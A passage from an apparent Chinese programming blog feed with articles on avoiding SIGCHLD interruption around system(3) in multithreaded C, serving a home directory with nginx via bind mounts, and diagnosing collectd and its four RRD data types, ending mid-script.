另外还有信号标志 SA_RESTART ，用于自动重试被中断的系统调用，考虑到它只支持部分系统调用，而且我用到的平台不支持这一标志，所以不作考虑。
</p>

<p>
那么该如何避免 SIGCHLD 信号中断系统调用呢？
</p>


<p>
根据 system(3) 函数的 <a href="http://man7.org/tlpi/code/online/dist/procexec/system.c.html">源码</a> ，其关键逻辑如下：
</p>

<ul class="org-ul">
<li>保存信号掩码</li>

<li>设置信号掩码为阻塞（SIG_BLOCK） SIGCHLD 信号</li>

<li>fork(3)

<ul class="org-ul">
<li><p>
子进程
</p>

<p>
重置为保存的信号掩码，然后 execl(3)
</p></li>

<li><p>
父进程
</p>

<p>
等待子进程（waitpid(3)）结束，重置为保存的信号掩码
</p></li>
</ul></li>
</ul>

<p>
子进程结束时操作系统会给父进程发送 SIGCHLD 信号，父进程会遍历（通常从主线程找起）一个不阻塞 SIGCHLD 的线程进行处理。
</p>


<div id="outline-container-org20da010" class="outline-2">
<h2 id="org20da010">在整个应用中忽略 SIGCHLD 信号会导致获取不到子进程退出码</h2>
<div class="outline-text-2" id="text-org20da010">
<p>
在应用程序最开始的时候（main 函数），添加以下语句
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #de935f;">signal</span>(<span style="color: #81a2be;">SIGCHLD</span>, <span style="color: #81a2be;">SIG_IGN</span>);
</pre>
</div>

<p>
子线程会继承主线程的信号处理，也就不会导致系统调用被中断。
signal(3) 设置的是整个进程的信号处理，由所有线程共享，千万不要以为子线程继承设置后就跟主线程没有关系了，
只有程序中有代码动了 SIGCHLD 的处置方式，所有线程都会受影响。
</p>

<p>
然而，它会导致 system(3) 总是返回 -1，errno 为 ECHILD（10: No child processes），无法判断命令执行是否成功。
</p>

<p>
<a href="http://stackoverflow.com/a/25039605/802708">c - system() function while SIGCHLD is ignored - Stack Overflow</a> 或 man wait(2)
</p>
<blockquote>
<p>
POSIX.1-2001 指明，如果将 SIGCHLD 置为 SIG_IGN，或者为 SIGCHLD 指定 SA_NOCLDWAIT 标志（见 sigaction(2)），子进程结束后将不会成为僵尸进程，调用 wait() 或 waitpid() 将阻塞到所有子进程结束后返回错误，errno 设置为 ECHILD。
</p>

<p>
POSIX.1-2001 specifies that if the disposition of SIGCHLD is set to SIG_IGN or the SA_NOCLDWAIT flag is set for SIGCHLD (see sigaction(2)), then children that terminate do not become zombies and a call to wait() or waitpid() will block until all children have terminated, and then fail with errno set to ECHILD.
</p>
</blockquote>

<p>
<a href="https://www.win.tue.nl/~aeb/linux/lk/lk-5.html">The Linux kernel: Signals</a>
</p>
<blockquote>
<p>
If the parent is not interested it can say so explicitly (before the fork) using
</p>

<p>
signal(SIGCHLD, SIG_IGN);
</p>

<p>
or
</p>

<p>
struct sigaction act;
act.sa_handler = something;
act.sa_flags = SA_NOCLDWAIT;
sigaction (SIGCHLD, &amp;act, NULL);
</p>

<p>
and as a result it will not hear about deceased children, and children will not be transformed into zombies. Note that the default action for SIGCHLD is to ignore this signal; nevertheless signal(SIGCHLD, SIG_IGN) has effect, namely that of preventing the transformation of children into zombies. In this situation, if the parent does a wait(), this call will return only when all children have exited, and then returns -1 with errno set to ECHILD.
</p>
</blockquote>

<p>
system(3) 调用 waitpid(3) 时，子进程已经被系统自动回收，消失得无影无踪，也就取不到子进程的返回值。
</p>
</div>

<div id="outline-container-org892569a" class="outline-3">
<h3 id="org892569a">使用 popen(3)/pclose(3) 来代替 system(3) 通过分析标准输出来判断命令执行是否成功</h3>
<div class="outline-text-3" id="text-org892569a">
<div class="org-src-container">
<pre class="src src-c"><span style="color: #81a2be;">int</span> <span style="color: #de935f;">system2</span>(<span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">command</span>, <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">output</span>, <span style="color: #81a2be;">size_t</span> <span style="color: #f0c674;">output_size</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">FILE</span>* <span style="color: #f0c674;">p</span> = popen(command, <span style="color: #8abeb7;">"r"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (p) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> memset(output, <span style="color: #8abeb7;">'\0'</span>, output_size);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fread(output, output_size - 1, 1, p);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> pclose(p);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
}
</pre>
</div>

<p>
使用示例
</p>

<div class="org-src-container">
<pre class="src src-C"><span style="color: #81a2be;">char</span> <span style="color: #f0c674;">output</span>[255];
<span style="color: #b5bd68;">if</span> (0 == system2(<span style="color: #8abeb7;">"mkdir /test; echo ret=$?"</span>, output, <span style="color: #b5bd68;">sizeof</span>(output)) &amp;&amp; strstr(o<span style="text-decoration: underline;">utput, </span><span style="color: #8abeb7; text-decoration: underline;">"ret=0"</span><span style="text-decoration: underline;">)) {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"mkdir /test successed"</span>);
} <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"mkdir /test failed"</span>);
}
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orgfc7d358" class="outline-2">
<h2 id="orgfc7d358">在整个应用中阻塞 SIGCHLD 信号可能导致出现僵尸进程</h2>
<div class="outline-text-2" id="text-orgfc7d358">
<p>
signal(3) 无法阻塞一个信号，只支持忽略（SIG_IGN）和恢复缺省处理（SIG_DFL）。
</p>

<p>
阻塞（ SIG_BLOCK）和取消阻塞（SIG_UNBLOCK）用于信号掩码（Signal Mask），如 sigprocmask(3) ，多线程下请使用 pthread_sigmask(3)。
</p>

<p>
主线程在创建子线程之前阻塞 SIGCHLD 信号
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #81a2be;">sigset_t</span> <span style="color: #f0c674;">set</span>;
sigemptyset(&amp;set);
sigaddset(&amp;set, SIGCHLD);
<span style="color: #de935f;">pthread_sigmask</span>(<span style="color: #81a2be;">SIG_BLOCK</span>, &amp;set, <span style="color: #81a2be;">NULL</span>);
</pre>
</div>

<p>
通过继承主线程的信号处理，子线程调用 system(3) 创建子进程时能够保证其中的 waitpid(3) 调用成功获取子进程的退出码。
</p>

<p>
man signal(7)
</p>
<blockquote>
<p>
通过 fork(2) 创建的子进程继承父进程的信号掩码，该信号掩码即使在 execve(2) 后仍得以保留。
</p>

<p>
A child created via fork(2) inherits a copy of its parent's signal mask; the signal mask is preserved across execve(2).
</p>
</blockquote>

<p>
system(3) 在替换进程为新程序（execl(3)）之前，会重置为保存的信号掩码，也就是阻塞 SIGCHLD 信号状态，子进程继承这一掩码可能会产生问题。
</p>
</div>

<div id="outline-container-orgdfa1c49" class="outline-3">
<h3 id="orgdfa1c49">在整个应用中阻塞 SIGCHLD 信号会导致一种常用的回收僵尸进程的方法失效</h3>
<div class="outline-text-3" id="text-orgdfa1c49">
<p>
<a href="http://www.microhowto.info/howto/reap_zombie_processes_using_a_sigchld_handler.html">Reap zombie processes using a SIGCHLD handler</a> 有详细描述
</p>

<blockquote>
<p>
The method described here has two steps:
</p>

<ol class="org-ol">
<li>Define a handler for SIGCHLD that calls waitpid.</li>

<li>Register the SIGCHLD handler.</li>
</ol>
</blockquote>

<p>
这种回收僵尸进程的方法不但我们自已不能使用，并且我们调用的子进程也不能使用，除非子进程聪明到先清除 SIGCHLD 信号掩码。
</p>

<p>
相关 BUG 报告
<a href="https://bugzilla.mindrot.org/show_bug.cgi?id=271">271 – SSHD should unblock SIGCHLD - POSIX signal blocks survive exec()</a>
</p>

<p>
通过 system(3) 启动 sshd，有用户尝试登录，sshd 会再 fork(3) 一个孙进程，然后在 SIGCHLD 信号处理函数中通过 waitpid(3) 回收孙进程，但是从父进程（调用 system(3)的进程）继承而来信号掩码阻塞了 SIGCHLD 信号，导致孙进程结束后成为僵尸进程。
</p>
</div>
</div>

<div id="outline-container-orgc347c0a" class="outline-3">
<h3 id="orgc347c0a">在调用 system(3) 前暂时取消对 SIGCHLD 的阻塞</h3>
<div class="outline-text-3" id="text-orgc347c0a">
<div class="org-src-container">
<pre class="src src-C"><span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#23553;&#35013; system(3) &#65292;&#19968;&#26041;&#38754;&#36991;&#20813;&#20013;&#26029;&#31995;&#32479;&#35843;&#29992;&#65292;&#21478;&#19968;&#26041;&#38754;&#36991;&#20813;&#20986;&#29616;&#20725;&#23608;&#23385;&#36827;&#31243;.</span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#35831;&#35760;&#24471;&#20840;&#23616;&#22581;&#22622; SIGCHLD &#20449;&#21495;.</span>
<span style="color: #81a2be;">int</span> <span style="color: #de935f;">system2</span>(<span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">command</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#35843;&#29992; system(3) &#21069;&#21462;&#28040;&#23545; SIGCHLD &#30340;&#38459;&#22622;</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">sigset_t</span> <span style="color: #f0c674;">set</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> sigemptyset(&amp;set);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> sigaddset(&amp;set, SIGCHLD);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> pthread_sigmask(SIG_UNBLOCK, &amp;set, <span style="color: #81a2be;">NULL</span>);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">code</span> = system(command);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#35843;&#29992; system(3) &#21518;&#24674;&#22797;&#23545; SIGCHLD &#30340;&#38459;&#22622;</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> sigemptyset(&amp;set);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> sigaddset(&amp;set, SIGCHLD);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> pthread_sigmask(SIG_BLOCK, &amp;set, <span style="color: #81a2be;">NULL</span>);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> code;
}
</pre>
</div>

<p>
在调用 system(3) 前暂时取消对 SIGCHLD 的阻塞，使子进程继承到正确的信号掩码，调用返回后恢复对 SIGCHLD 的阻塞，可以解决这个问题。
</p>

<p>
另外还有 popen(3)/pclose(3) 也可以用来创建子进程，也要相应进行替换。
</p>
</div>
</div>
</div>

<div id="outline-container-org354be89" class="outline-2">
<h2 id="org354be89">进程的信号处理状态可在 proc 文件系统看到</h2>
<div class="outline-text-2" id="text-org354be89">
<p>
如进程 pid 为 5526 ，获取到的进程忽略的信号发下
</p>

<pre class="example">
# grep SigIgn /proc/5526/status
SigIgn: 0000000000001004
</pre>

<p>
这是十六进制掩码，转化为二进制
</p>

<pre class="example">
$ node -e 'console.log((0x0000000000001004).toString(2))'
1000000000100
</pre>

<p>
表示信号 3（SIGQUIT） 和 信号 13 （SIGPIPE）被屏蔽。
</p>
</div>
</div>

<div id="outline-container-orga3d6387" class="outline-2">
<h2 id="orga3d6387">参考</h2>
<div class="outline-text-2" id="text-orga3d6387">
<ul class="org-ul">
<li><a href="http://www.linuxprogrammingblog.com/all-about-linux-signals?page=show">All about Linux signals | Linux Programming Blog</a></li>
</ul>


<ul class="org-ul">
<li><a href="https://www.win.tue.nl/~aeb/linux/lk/lk-5.html">The Linux kernel: Signals</a></li>
</ul>


<ul class="org-ul">
<li><a href="http://www.oschina.net/question/54100_30293">Linux下调用system()函数导致的问题 - 开源中国社区</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决个人用户目录做为 Web 服务根目录的权限问题]]></title>
            <link>/article/89e351b34e2a4eba7528623776ee5f55505a4e3a-web-670d52a1683976ee5f5576846743965095ee9898.html</link>
            <guid>/article/89e351b34e2a4eba7528623776ee5f55505a4e3a-web-670d52a1683976ee5f5576846743965095ee9898.html</guid>
            <pubDate>Tue, 14 Jun 2016 05:38:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
我们在个人帐号目录下进行日常的开发工作，通常使用弱权限帐号（如：nobody）运行 Web 服务器（如：nginx）。
</p>

<p>
nginx 配置 Web 服务器的根目录为个人用户目录，这样修改代码后刷新浏览器就可以看到效果。
</p>

<pre class="example">
user nobody;

server {
   listen       80;
   server_name  www.example.com;

   location / {
       root   /home/tangxinfa/projects/www.example.com;
       index  index.html index.htm;
   }
}
</pre>

<p>
然而 linux 的用户权限系统禁止 Web 服务器用户（nobody）访问个人用户（tangxinfa）的数据。
</p>

<p>
使用浏览器访问，会得到一个错误页面
</p>
<pre class="example">
403 Forbidden
</pre>

<p>
使用 linux 命令确认问题是由用户权限系统引起
</p>
<pre class="example">
$ sudo -u nobody -g nobody ls -la /home/tangxinfa/projects/www.example.com
ls: cannot access '/home/tangxinfa/projects/www.example.com': Permission denied
</pre>


<p>
解决方法有以下几种：
</p>

<ul class="org-ul">
<li><p>
使用软链接
</p>

<p>
很多人都会下意识地想到通过软链接来解决
</p>
<pre class="example">
sudo ln -s /home/tangxinfa/projects/www.example.com /var/www/
sudo chown -R nobody:nobody /var/www/www.example.com
sudo chown -R nobody:nobody /home/tangxinfa/projects/www.example.com
</pre>
<p>
将个人用户目录链到 Web 服务器用户目录下是没有用的，linux 按原始路径（/home/tangxinfa/projects/www.example.com）来检查权限。
</p>

<p>
可以反过来，将项目从个人用户目录移到 Web 服务器用户目录下，然后反向建一个软链接，即可以让 Web 服务器工作正常，又不影响日常开发。
</p>

<pre class="example">
sudo mv /home/tangxinfa/projects/www.example.com /var/www/
ln -s /var/www/www.example.com /home/tangxinfa/projects/
</pre>

<p>
但是，如果项目是版本控制系统（如：git）仓库的一个子项目（目录），将目录变成软链接后 git 会认为目录被删除了。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
用户目录给 Web 服务帐号开放权限
</p>

<p>
按 linux 的帐号权限系统要求，修改（chmod）用户目录的属性，每一级目录的权限都要修改，容易过渡放开权限，引入安全问题。
</p>

<p>
设置 Web 服务帐号为用户帐号
</p>

<pre class="example">
user tangxinfa;
</pre>

<p>
由于 Web 服务器（nginx）通常配有多个服务，Web 服务帐号是全局共用的，其它服务的目录权限也要进行调整。
如果 nginx 只运行这一个服务的话，还是可行的。
</p>

<p>
设置 Web 服务帐号为 root 帐号
</p>

<pre class="example">
user root;
</pre>

<p>
使用 root 帐号会引入安全隐患，一般不推荐，但很少会遇到目录权限方面的问题，可以应急使用。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
将用户目录挂载到 Web 帐号目录下
</p>

<p>
mount 命令支持将一个目录重新挂载到其它位置
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo mkdir /var/www/www.example.com
sudo chown nobody:nobody /var/www/www.example.com
sudo mount --bind -o ro,<span style="color: #f0c674;">username</span>=nobody /home/tangxinfa/projects/www.example.com<span style="text-decoration: underline;"> /var/www/www.example.com</span>
</pre>
</div>

<p>
Web 服务器和日常开发可以兼顾，两全其美的方案。
</p>

<p>
bind 形式的挂载放到 /etc/fstab 会挂载失败（估计是挂载时相关依赖还没有准备好），影响开机。
</p>

<p>
创建挂载脚本 /usr/sbin/bind-mounts 并添加可执行权限，内容如下
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

mount --bind -o ro,<span style="color: #f0c674;">username</span>=nobody /home/tangxinfa/projects/www.example.com /var<span style="text-decoration: underline;">/www/www.example.com</span>
</pre>
</div>

<p>
创建 systemd 服务文件 /usr/lib/systemd/system/bind-mounts.service
</p>
<pre class="example">
[Unit]
Description=Bind Mounts
After=local-fs.target

[Service]
Type=simple
ExecStart=/usr/sbin/bind-mounts

[Install]
WantedBy=multi-user.target
</pre>

<p>
启用 bind-mounts 服务
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo systemctl enable bind-mounts
</pre>
</div></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[collectd 问题诊断方法]]></title>
            <link>/article/collectd-95ee98988bca65ad65b96cd5.html</link>
            <guid>/article/collectd-95ee98988bca65ad65b96cd5.html</guid>
            <pubDate>Mon, 30 May 2016 08:27:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgda0df27" class="outline-2">
<h2 id="orgda0df27">输出日志</h2>
<div class="outline-text-2" id="text-orgda0df27">
<p>
<code>collectd.conf</code>
</p>
<pre class="example">
LoadPlugin "logfile"
&lt;Plugin "logfile"&gt;
  LogLevel "info"
  File "/var/log/collectd.log"
  Timestamp true
&lt;/Plugin&gt;
</pre>

<p>
collectd-exec 插件执行的脚本标准错误输出（stderr）会出现在日志文件中（/var/log/collectd.log）。
</p>

<p>
通过分析日志可以查出统计脚本本身的问题。
</p>
</div>
</div>

<div id="outline-container-org359ad76" class="outline-2">
<h2 id="org359ad76">网络抓包</h2>
<div class="outline-text-2" id="text-org359ad76">
<p>
使用 tcpdump 抓包
</p>
<div class="org-src-container">
<pre class="src src-sh">tcpdump -i any host &lt;collectd server ip&gt; -XX -tttt -nnnn -s 0 -w ~/&lt;collectd ser<span style="text-decoration: underline;">ver ip&gt;.pcap</span>
</pre>
</div>
<p>
请将 <code>&lt;collectd server ip&gt;</code> 替换为 collectd.conf 中 <code>network</code> 插件中的 <code>Server</code> 值。
</p>

<p>
使用 wireshark 查看抓到的包，右键菜单中选择 <code>Decode As...</code> ，弹出的列表中选择按 <code>collectd</code> 协议进行解析。
</p>

<p>
检查上报的数据是否有问题。
</p>

<p>
如果上报的数据是正常的，则有可能是以前上报了有问题的数据导致，请尝试从 collectd 服务器上直接将相应的 rrd 文件删除。
</p>
</div>
</div>

<div id="outline-container-org0afb780" class="outline-2">
<h2 id="org0afb780">分析 rrd 文件</h2>
<div class="outline-text-2" id="text-org0afb780">
<p>
collectd 是使用 RRDtool 进行数据存储，直接查看 rrd 文件数据是最直接的诊断方法。
</p>

<div class="org-src-container">
<pre class="src src-sh">rrdtool fetch /var/lib/collectd/localhost/test/gauge.rrd AVERAGE --start 1464585<span style="text-decoration: underline;">532 --end N</span>
</pre>
</div>

<p>
RRDtool 的用法请参考 <a href="http://oss.oetiker.ch/rrdtool/tut/rrdtutorial.en.html">RRDtool - rrdtutorial</a>
</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[理解 collectd 的四种数据类型]]></title>
            <link>/article/740689e3-collectd-768456db79cd6570636e7c7b578b.html</link>
            <guid>/article/740689e3-collectd-768456db79cd6570636e7c7b578b.html</guid>
            <pubDate>Mon, 30 May 2016 06:32:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org71f3dbe" class="outline-2">
<h2 id="org71f3dbe">collectd 的基础是 <a href="http://oss.oetiker.ch/rrdtool/">RRDtool</a></h2>
<div class="outline-text-2" id="text-org71f3dbe">
<blockquote>
<p>
RRDtool is the OpenSource industry standard, high performance data logging and graphing system for time series data.
</p>
</blockquote>

<blockquote>
<p>
What makes RRDtool so special?
</p>

<p>
RRDtool is GNU licensed software developed by Tobias Oetiker, a system manager at the Swiss Federal Institute of Technology. Though it is a database, there are distinct differences between RRDtool databases and other databases as listed below:
</p>

<ul class="org-ul">
<li>RRDtool stores data; that makes it a back-end tool. The RRDtool command set allows one to create graphs; that makes it a front-end tool as well. Other databases just store data and can not create graphs.</li>

<li>In case of linear databases, new data gets appended at the bottom of the database table. Thus its size keeps on increasing, whereas the size of an RRDtool database is determined at creation time. Imagine an RRDtool database as the perimeter of a circle. Data is added along the perimeter. When new data reaches the starting point, it overwrites existing data. This way, the size of an RRDtool database always remains constant. The name "Round Robin" stems from this behavior.</li>

<li>Other databases store the values as supplied. RRDtool can be configured to calculate the rate of change from the previous to the current value and store this information instead.</li>

<li>Other databases get updated when values are supplied. The RRDtool database is structured in such a way that it needs data at predefined time intervals. If it does not get a new value during the interval, it stores an UNKNOWN value for that interval. So, when using the RRDtool database, it is imperative to use scripts that run at regular intervals to ensure a constant data flow to update the RRDtool database.</li>
</ul>
</blockquote>

<blockquote>
<p>
是什么让 RRDtool 如此特殊？
</p>

<p>
RRDtool 是由 Tobias Oetiker 开发的遵循 GNU 协议的软件，他是 Swiss Federal Institute of Technology 的 system manager。虽然 RRDtool 是一个数据库，但与其它数据库有着明显的区别，如下所述：
</p>

<ul class="org-ul">
<li>RRDtool 存储数据，是后端工具。RRDtool 命令集可用于创建图表，因此它也是前端工具。其它数据库只存储数据但不创建图表。</li>

<li>做为线性数据库，新数据追加在数据库的底部。这样它的尺寸会不断增长，然而 RRDtool 数据库的尺寸在创建时确定。想像 RRDtool 数据库是圆周长。数据随着周长添加。当新数据达到起始点，它会覆盖已存在的数据。这样，RRDtool 数据库的尺寸总是保持不变。因此得名“Round Robin”。</li>

<li>其它数据库存储供应的数据值。而 RRDtool 可配置为计算前一个值到当前值的变化率，做为替代物进行存储。</li>

<li>其它数据库在供应数据值时就会进行更新。RRDtool 数据库构造为需要预定义时间间隔的数据。在一个时间间隔内，如果它无法获取到一个新值，它会为该时间间隔存储一个未知（UNKNOWN） 值。因此，使用 RRDtool 数据库时，必须定期运行脚本确保恒定的数据流去更新 RRDtool 数据库。</li>
</ul>
</blockquote>

<p>
以上引用自 <a href="http://oss.oetiker.ch/rrdtool/tut/rrd-beginners.en.html">RRDtool - rrd-beginners</a>
</p>
</div>
</div>

<div id="outline-container-org89213d6" class="outline-2">
<h2 id="org89213d6">collectd 的四种数据类型</h2>
<div class="outline-text-2" id="text-org89213d6">
<p>
RRDtool 默认的时间间隔为 300 秒（5分钟），collectd 默认时间间隔为 10 秒。
</p>

<p>
通常的建议是上报数据时，确保时间间隔与 collectd 服务器的设置一致（即 COLLECTD_INTERVAL），
但是了解 collectd 会如何处理上报的值，更有利于我们正确地上报数据，获得理想的结果。
</p>

<p>
collectd 用到了 RRDtool 中的四种数据类型：ABSOLUTE、COUNTER、DERIVE、GAUGE，《<a href="http://blog.kankanan.com/article/collectd-6570636e7c7b578b8be689e3.html">collectd 数据类型详解</a>》 已有描述，而具体如何使用则看本文。
</p>

<p>
假设要上报一个 100/秒 的统计值，在一个时间间隔（10 秒）内分成多部分上报，分别使用四种数据类型进行上报。
</p>

<p>
<code>absolute.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #f0c674;">HOSTNAME</span>=<span style="color: #8abeb7;">"${COLLECTD_HOSTNAME:-localhost}"</span>
<span style="color: #f0c674;">VALUE</span>=0

<span style="color: #b5bd68;">while</span> [ 1 ]; <span style="color: #b5bd68;">do</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 3
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=200
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/absolute\" N:$VALUE"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=100
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/absolute\" N:$VALUE"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 6
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=700
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/absolute\" N:$VALUE"</span>
<span style="color: #b5bd68;">done</span>
</pre>
</div>

<p>
<code>ABSOLUTE</code> 类型值的处理
</p>
<blockquote>
<p>
将时间间隔（10 秒）内的上报的值进行累加，然后与时间间隔（10 秒）相除
</p>

<p>
(200 + 100 + 700)/10 == 100
</p>
</blockquote>

<p>
<code>counter.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #f0c674;">HOSTNAME</span>=<span style="color: #8abeb7;">"${COLLECTD_HOSTNAME:-localhost}"</span>
<span style="color: #f0c674;">VALUE</span>=0

<span style="color: #b5bd68;">while</span> [ 1 ]; <span style="color: #b5bd68;">do</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 3
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=$[VALUE+500]
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=$[VALUE+200]
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 6
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=$[VALUE+300]
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"</span>
<span style="color: #b5bd68;">done</span>
</pre>
</div>

<p>
<code>COUNTER</code> 类型值的处理
</p>
<blockquote>
<p>
将时间间隔（10 秒）内的变化值（时间间隔内最后上报的值减去上一时间间隔最后上报的值）与时间间隔（10 秒）相除
</p>

<p>
(2000 - 1000) / 10 == 100
</p>
</blockquote>

<p>
<code>derive.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #f0c674;">HOSTNAME</span>=<span style="color: #8abeb7;">"${COLLECTD_HOSTNAME:-localhost}"</span>
<span style="color: #f0c674;">VALUE</span>=0

<span style="color: #b5bd68;">while</span> [ 1 ]; <span style="color: #b5bd68;">do</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 3
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=$[VALUE+500]
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">VALUE</span>=$[VALUE+200]
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"PUTVAL \"$HOSTNAME/test/counter\" N:$VALUE"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 6
